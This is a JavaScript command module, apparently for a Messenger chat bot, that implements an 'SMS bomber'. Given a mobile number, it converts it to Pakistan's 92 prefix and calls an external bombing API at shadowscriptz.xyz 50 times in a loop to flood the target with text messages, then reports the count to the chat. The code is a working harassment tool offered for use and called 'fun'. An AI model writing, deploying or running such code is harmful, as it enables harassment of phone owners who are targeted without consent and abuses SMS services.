const axios = require("axios");

module.exports = {
  config: {
    name: "bomber",
    aliases: [],
    version: "1.0.0",
    credits: "CHAND",
    description: "Fun SMS bomber (50 messages max per request)",
    hasPrefix: true,
    category: "system",
    usage: "bomber <number>",
    cooldown: 30
  },

  async run({ api, event, args }) {
    const { threadID, messageID } = event;
    const number = args[0];
    if (!number) {
      return api.sendMessage(`📱 𝑷𝒍𝒆𝒂𝒔𝒆 𝒆𝒏𝒕𝒆𝒓 𝒂 𝒎𝒐𝒃𝒊𝒍𝒆 𝒏𝒖𝒎𝒃𝒆𝒓!\n\n🔰 𝑬𝒙𝒂𝒎𝒑𝒍𝒆: \`bomber 0345XXXXXXX\``, threadID, messageID);
    }

    const target = number.startsWith("92") ? number : number.replace(/^0/, "92");

    try {
      let success = 0;
      const limit = 50;

      for (let i = 0; i < limit; i++) {
        const res = await axios.get(`https://shadowscriptz.xyz/public_apis/smsbomberapi.php?num=${target}`);
        if (res.data) success++;
      }

      const message = `❂━━❂━━❂━━❂━━❂\n         💣 𝑺𝑴𝑺 𝑩𝑶𝑴𝑩𝑬𝑹 𝑺𝒕𝒂𝒓𝒕𝒆𝒅! 💣\n\n📱 𝑻𝒂𝒓𝒈𝒆𝒕 𝑵𝒖𝒎𝒃𝒆𝒓: ${number}\n✅ 𝑴𝒆𝒔𝒔𝒂𝒈𝒆𝒔 𝑺𝒆𝒏𝒕: ${success} / ${limit}\n\n⚠️ 𝑵𝒐𝒕𝒆: 𝑳𝒊𝒎𝒊𝒕 𝒊𝒔 50 𝒎𝒆𝒔𝒔𝒂𝒈𝒆𝒔 𝒑𝒆𝒓 𝒓𝒆𝒒𝒖𝒆𝒔𝒕.\n\n❂━━❂━━❂━━❂━━❂`;
      return api.sendMessage(message, threadID, messageID);
    } catch (err) {
      console.error(err);
      return api.sendMessage(`❌ 𝑬𝒓𝒓𝒐𝒓 𝒅𝒖𝒓𝒊𝒏𝒈 𝑺𝑴𝑺 𝒔𝒆𝒏𝒅𝒊𝒏𝒈!\n⚠️ 𝑷𝒍𝒆𝒂𝒔𝒆 𝒄𝒉𝒆𝒄𝒌 𝒕𝒉𝒆 𝒏𝒖𝒎𝒃𝒆𝒓 𝒐𝒓 𝒕𝒓𝒚 𝒂𝒈𝒂𝒊𝒏 𝒍𝒂𝒕𝒆𝒓.`, threadID, messageID);
    }
  }
};
